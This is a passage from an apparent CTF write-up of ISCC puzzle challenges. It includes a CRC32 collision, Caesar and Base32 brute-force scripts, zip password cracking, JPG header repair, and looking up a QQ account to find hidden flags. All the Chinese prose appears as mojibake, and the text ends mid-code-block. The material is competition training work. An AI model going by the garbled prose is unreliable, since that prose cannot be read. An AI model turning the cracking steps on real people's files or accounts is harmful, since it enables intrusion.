title="æ··ä¹±çš„éŸ³é¢‘"></a>æ··ä¹±çš„éŸ³é¢‘</h3><blockquote><p>é¢˜ç›®æè¿°ï¼š<br>å°æ˜æ­£åœ¨æ•´ç†åŒ…å«bedã€birdã€catã€dogã€downã€eightçš„éŸ³é¢‘æ–‡ä»¶æ•°æ®ï¼Œå¯å°æ˜ä¸å°å¿ƒæŠŠåˆ†ç±»å¥½çš„ä¸€éƒ¨åˆ†æ•°æ®é›†å¼„æ··äº†ã€‚æ–‡ä»¶åéå¸¸æ··ä¹±ï¼Œæ— æ³•åˆ¤åˆ«å‡ºé‚£äº›æ–‡ä»¶å±äºå“ªä¸ªå•è¯ç±»åˆ«ã€‚ç¢°å·§å°çº¢æ¥é—®å°æ˜è€ƒè¯•å¤ä¹ èµ„æ–™çš„å¯†ç ã€‚å°æ˜è¯´ï¼šâ€œæˆ‘è®°å¾—è¿™ä¸ªå¯†ç éƒ½æ˜¯å¤§å†™çš„è‹±æ–‡å­—æ¯ï¼Œå¹¶ä¸”å¯†ç å’Œæˆ‘çš„çˆ±å¥½æ¯æ¯ç›¸å…³ï¼Œå…·ä½“çš„æˆ‘ä¹Ÿè®°ä¸æ¸…äº†ã€‚ä½ è¦æ˜¯èƒ½å¸®æˆ‘æŠŠè¿™äº›éŸ³é¢‘æ–‡ä»¶åˆ†å¥½ç±»ï¼Œä½ åº”è¯¥å°±ä¼šå‘ç°å¯†ç ã€‚â€å°çº¢äº†è§£åˆ°å°æ˜æ˜¯ä¸ªè®¡ç®—æœºä¸“ä¸šçš„å­¦ç”Ÿï¼Œå¹³æ—¶ç»å¸¸æœé›†ä¸€äº›ä¸ä¿¡æ¯æŠ€æœ¯æœ‰å…³çš„æ–°é—»èµ„è®¯ã€‚ä»–ç»å¸¸å‚åŠ ctfæ¯”èµ›ï¼Œå¯¹å¯†ç å­¦ååˆ†ç†Ÿæ‚‰ï¼Œå¯¹æ•°å­—éå¸¸æ•æ„Ÿã€‚ä¸ºäº†å°çº¢èƒ½å¾—åˆ°è€ƒè¯•å¤ä¹ èµ„æ–™ï¼Œä½ èƒ½å¸®åŠ©å°çº¢å°†æ··ä¹±çš„éŸ³é¢‘æ–‡ä»¶åˆ†å¥½ç±»å¹¶è·å–å¯†ç å—ï¼Ÿ<br>æç¤ºï¼šæ¯”ä¾‹ æ•°æ®ä¸‹è½½é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw">https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw</a> æå–ç ï¼šp1yh</p></blockquote><h3 id="å°æ˜çš„å® ç‰©å…”"><a href="#å°æ˜çš„å® ç‰©å…”" class="headerlink" title="å°æ˜çš„å® ç‰©å…”"></a>å°æ˜çš„å® ç‰©å…”</h3><blockquote><p>é¢˜ç›®æè¿°ï¼š<br>å°æ˜çš„å® ç‰©å…”æ€»æ˜¯å‘å‡ºä¸€äº›ç¥ç§˜çš„å£°éŸ³ï¼Œå°æ˜å¾ˆæƒ³çŸ¥é“å…”å…”åœ¨å¹²ä»€ä¹ˆï¼Œä½ èƒ½å¸®ä»–ç¿»è¯‘ä¸€ä¸‹å—ï¼Ÿ</p></blockquote><p>ä¸€å¼ å›¾ç‰‡rabbit.txtï¼Œæç¤ºç¢°æ’ï¼Œåº”è¯¥æ˜¯CRC32ç¢°æ’ï¼Œforemoståˆ†ç¦»å‡ºå‹ç¼©åŒ…</p><p>flag.txtå†…å®¹ï¼ŒåŠ saltï¼Œåº”è¯¥æ˜¯rabbitåŠ å¯†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==<br></code></pre></td></tr></table></figure><p>CRC32ç¢°æ’ï¼Œå¾—åˆ°åŠ å¯†å‹ç¼©åŒ…key.zipå†…å®¹ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/Python/CRC32]<br>â””â”€$ python3 crc32.py reverse <span class="hljs-number">0x3dacac6b</span> <br><span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>: &#123;<span class="hljs-number">0x47</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xce</span>&#125;<br>verification checksum: <span class="hljs-number">0x3dacac6b</span> (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: (<span class="hljs-number">0_0</span>) (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: DCr4m (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 1QhloU (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 3mmr6H (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 49Gqqk (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 5Uumn6 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 7ips7+ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 8Gpbyp (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 9G1Sbi (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: EHZxWz (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: F93jxv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: I6mk_a (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: J+wTt) (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: K+6eo0 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: KGEHkt (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: N/jUuJ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O/+dnS (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O3d8oG (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: TX.K94 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Uy1jKa (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: XJju5k (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: YJ+D.r (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Zvoklv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: a3H1hL (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: dG(pwf (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: e7U0i/ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: fgb2/o (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: g6AbXj (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kHvqPq (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kT9-Qe (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: lQqOzZ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: vwW0Z8 (OK)                     <br></code></pre></td></tr></table></figure><p>5å­—èŠ‚ï¼Œæœ€ç»ˆå¯†é’¥ä¸º<code>(0_0)</code>ï¼ŒRabbitè§£å¯†å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210518182708616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ“‚å°"><a href="#æ“‚å°" class="headerlink" title="æ“‚å°"></a>æ“‚å°</h2><h3 id="å°æ˜çš„è¡¨æƒ…åŒ…"><a href="#å°æ˜çš„è¡¨æƒ…åŒ…" class="headerlink" title="å°æ˜çš„è¡¨æƒ…åŒ…"></a>å°æ˜çš„è¡¨æƒ…åŒ…</h3><blockquote><p>æ”¾å‡æœŸé—´å°çº¢è¢«äº²æˆšå«å»å¸®åº—é‡Œå¸®å¿™ï¼Œåº—é‡Œå¿™æäº†å¯¼è‡´å°çº¢æ²¡æœ‰æ—¶é—´å†™ä»£ç ã€‚å°çº¢è‹¦æ¼æäº†ï¼Œå¥¹çªç„¶æƒ³èµ·æ¥å°æ˜æœ‰ä¸€å¼ éå¸¸é€‚åˆæè¿°å¥¹æ­¤æ—¶å¿ƒæƒ…çš„è¡¨æƒ…åŒ…ã€‚äºæ˜¯ï¼Œå°çº¢è®©å°æ˜æŠŠè¡¨æƒ…åŒ…åˆ†äº«ç»™å¥¹ã€‚å°æ˜è¯´å¦‚æœä½ è®°å¾—æˆ‘çš„å‡ºç”Ÿçš„æ—¥æœˆå¹´ï¼Œæˆ‘å°±äº¤ç»™ä½ ã€‚å°æ˜çš„ç”Ÿæ—¥å¹´ä»½éšè—åœ¨è¿™ä¸²å‡¯æ’’å¯†ç â€œAVARGRRA<br>AVARGL AVARâ€ä¸­ï¼Œä½ èƒ½å¸®å°çº¢å¾—åˆ°å°æ˜çš„è¡¨æƒ…åŒ…å—ï¼Ÿ</p></blockquote><p>ç¼–å†™è„šæœ¬è¿›è¡Œå‡¯æ’’å¯†ç çˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;AVARGRRA AVARGL AVAR&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br><br></code></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰å«ä¹‰çš„è‹±æ–‡ï¼šNINETEEN NINETY NINE<br><img src="https://img-blog.csdnimg.cn/20210502214305685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çŒœæµ‹æ˜¯901909ï¼Œç„¶è€Œå¹¶ä¸æ˜¯å‹ç¼©åŒ…å£ä»¤ï¼Œæ ¹æ®é¢˜ç›®æç¤ºå¯†ç æ˜¯ç”Ÿæ—¥å¹´ä»½ï¼Œç›´æ¥çˆ†ç ´8ä½æ•°å­—å¯†ç <br><img src="https://img-blog.csdnimg.cn/20210502214743451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°å£ä»¤07071999ï¼Œè§£å‹å‹ç¼©åŒ…ï¼Œå¾—åˆ°çš„jpgæ–‡ä»¶æ— æ³•æ‰“å¼€ï¼Œæ‹–å…¥010 editorä¸­ï¼Œä¸æ­£å¸¸çš„jpgæ–‡ä»¶æ¯”è¾ƒï¼Œå‘ç°ç¼ºå°‘JPGæ–‡ä»¶å¤´<br><img src="https://img-blog.csdnimg.cn/20210502215507914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†å‰å…«ä½æ”¹ä¸ºFF D8 FF E0 00 10 4A 46ï¼Œä¿å­˜å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210502215613249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Baseå°å·"><a href="#Baseå°å·" class="headerlink" title="Baseå°å·"></a>Baseå°å·</h3><blockquote><p>è¢«å‡¯æ’’å°çŒ«å·èµ°çš„ç­‰å·1/3<br>Flagæ ¼å¼ï¼šflag{XXX}</p></blockquote><p>å¯†æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šé¢çš„å‡¯æ’’å¯†ç çˆ†ç ´è„šæœ¬ï¼Œä¿®æ”¹ä¸€ä¸‹è„šæœ¬ï¼Œå†™å…¥crack.txtæ–‡ä»¶ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli&quot;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;crack.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br>    f.write(t+<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°crack.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br>usfgz2l2pw2mjh2hre2frblpykrdx4mauogmj<br>vtgha2m2qx2nki2isf2gscmqzlsey4nbvphnk<br>wuhib2n2ry2olj2jtg2htdnramtfz4ocwqiol<br>xvijc2o2sz2pmk2kuh2iueosbnuga4pdxrjpm<br>ywjkd2p2ta2qnl2lvi2jvfptcovhb4qeyskqn<br>zxkle2q2ub2rom2mwj2kwgqudpwic4rfztlro<br>aylmf2r2vc2spn2nxk2lxhrveqxjd4sgaumsp<br>bzmng2s2wd2tqo2oyl2myiswfryke4thbvntq<br>canoh2t2xe2urp2pzm2nzjtxgszlf4uicwour<br>dbopi2u2yf2vsq2qan2oakuyhtamg4vjdxpvs<br>ecpqj2v2zg2wtr2rbo2pblvziubnh4wkeyqwt<br>fdqrk2w2ah2xus2scp2qcmwajvcoi4xlfzrxu<br>gersl2x2bi2yvt2tdq2rdnxbkwdpj4ymgasyv<br>hfstm2y2cj2zwu2uer2seoyclxeqk4znhbtzw<br>igtun2z2dk2axv2vfs2tfpzdmyfrl4aoicuax<br>jhuvo2a2el2byw2wgt2ugqaenzgsm4bpjdvby<br>kivwp2b2fm2czx2xhu2vhrbfoahtn4cqkewcz<br>ljwxq2c2gn2day2yiv2wiscgpbiuo4drlfxda<br>mkxyr2d2ho2ebz2zjw2xjtdhqcjvp4esmgyeb<br>nlyzs2e2ip2fca2akx2ykueirdkwq4ftnhzfc<br>omzat2f2jq2gdb2bly2zlvfjselxr4guoiagd<br>pnabu2g2kr2hec2cmz2amwgktfmys4hvpjbhe<br>qobcv2h2ls2ifd2dna2bnxhlugnzt4iwqkcif<br>rpcdw2i2mt2jge2eob2coyimvhoau4jxrldjg<br>sqdex2j2nu2khf2fpc2dpzjnwipbv4kysmekh<br></code></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯Base32ç¼–ç ï¼Œå¾—åˆ°å¯†æ–‡æ¯è¡Œ37å­—ç¬¦ ï¼Œè€ŒBase32æŒ‰5æ¯”ç‰¹åˆ‡åˆ†çš„äºŒè¿›åˆ¶æ•°æ®å¿…é¡»æ˜¯40æ¯”ç‰¹çš„å€æ•°ï¼Œéœ€è¦åœ¨æ¯è¡Œæœ«å°¾è¿½ä¸‰ä¸ª===ï¼Œå¹¶ä¸”å°å†™è½¬æ¢ä¸ºå¤§å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: UTF-8</span><br><span class="hljs-keyword">import</span> base64<br><br>ff = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;crack.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        line_n =line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        line_n=line_n+<span class="hljs-string">r&#x27;===&#x27;</span>+<span class="hljs-string">&#x27;\n&#x27;</span>     <span class="hljs-comment">#è¡Œæœ«å°¾åŠ ä¸Š&quot;===&quot;,åŒæ—¶åŠ ä¸Š&quot;\n&quot;æ¢è¡Œç¬¦</span><br>        line_new=line_n.upper()        <span class="hljs-comment">#å°å†™è½¬æ¢ä¸ºå¤§å†™</span><br>        ff.write(line_new)           <span class="hljs-comment">#å†™å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­</span><br>ff.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>    <span class="hljs-built_in">list</span> = f.read().splitlines()   <span class="hljs-comment">#å­˜å…¥åˆ—è¡¨ä¸­</span><br>    i = <span class="hljs-number">0</span><br>    ls2 = [<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]  <span class="hljs-comment">#è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>):<br>        print(base64.b32decode(ls2[i]))<br>        i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ï¼Œå‘ç°ä¸€æ®µbase64ç¼–ç <br><img src="https://img-blog.csdnimg.cn/20210502213613369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>base64è§£ç å¾—åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">flag&#123;tqq.tqq@jjb&#125;<br></code></pre></td></tr></table></figure><h3 id="çœŸä½œå‡æ—¶å‡äº¦çœŸ"><a href="#çœŸä½œå‡æ—¶å‡äº¦çœŸ" class="headerlink" title="çœŸä½œå‡æ—¶å‡äº¦çœŸ"></a>çœŸä½œå‡æ—¶å‡äº¦çœŸ</h3><blockquote><p>æµ…éŸµå§å§ç¬¬ä¸€æ¬¡å‚åŠ ISCCï¼Œä½†æ²¡æœ‰å¾ˆå¤šCTFå·¥å…·ï¼Œä¸ºæ­¤å¥¹å¾ˆè‹¦æ¼ã€‚<br>ä½ èƒ½åˆ‡èº«ä½“ä¼šä¸€ä¸‹å—ï¼Ÿ<br>é™„ä»¶ä¸‹è½½é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw">https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw</a><br>æå–ç ï¼ša0oh</p></blockquote><p>ä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°download.wavï¼Œæ‹–å…¥AudacityæŸ¥çœ‹é¢‘è°±å›¾</p><p><img src="https://img-blog.csdnimg.cn/20210508204254102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¼„ä¸‹æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.. ... -.-. -.-. ---... .... . -.-. .... --- -. . -.-- --..-- .-.-.. -.-- --- ..- .-.. --- --- -.- .. -. --. ..-. --- .-. - .... . ..-. ..- -.-. -.- .. -. --. ..-. .-.. .- --. -. --- .-- ..--..<br></code></pre></td></tr></table></figure><p>æ‘©æ–¯å¯†ç è§£å¯†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCCHECHONEYYOULOOKINGFORTHEFUCKINGFLAGNOW?<br></code></pre></td></tr></table></figure><p>ä¸æ˜¯flagï¼Œforemoståˆ†ç¦»æ–‡ä»¶å¾—åˆ°ä¸€å¼ pngå›¾ç‰‡ï¼ŒexiftoolæŸ¥çœ‹å›¾ç‰‡ä¿¡æ¯ï¼Œå¾—åˆ°QQå·<br><img src="https://img-blog.csdnimg.cn/20210508204759240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹QQç©ºé—´ï¼Œåœ¨ç•™è¨€æ¿å‘ç°å‡flag<img src="https://img-blog.csdnimg.cn/20210508204953265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åŠ å¥½å‹é—®é¢˜<code>ISCC&#123;e@$Y_s0cia1_engineering&#125;</code>ä¹Ÿæ˜¯å‡flag</p><p>ç©ºé—´é‡Œå”¯ä¸€çš„ä¸€å¼ å›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/202105082051187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘å½“æ—¶åšçš„æ—¶å€™æ‰å‘é‡Œå»äº†ï¼Œç›´æ¥ä¸‹è½½å›¾ç‰‡ï¼Œ010 editorä»€ä¹ˆä¹Ÿçœ‹ä¸åˆ°ï¼Œæ€è·¯å°±æ–­äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/20210508193738188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”¨åŸå›¾åœ°å€é“¾æ¥ä¸‹è½½å›¾ç‰‡ï¼Œèƒ½çœ‹åˆ°ä¸€ä¸ªè“å¥äº‘é“¾æ¥<br><img src="https://img-blog.csdnimg.cn/20210508193452110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æå–å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 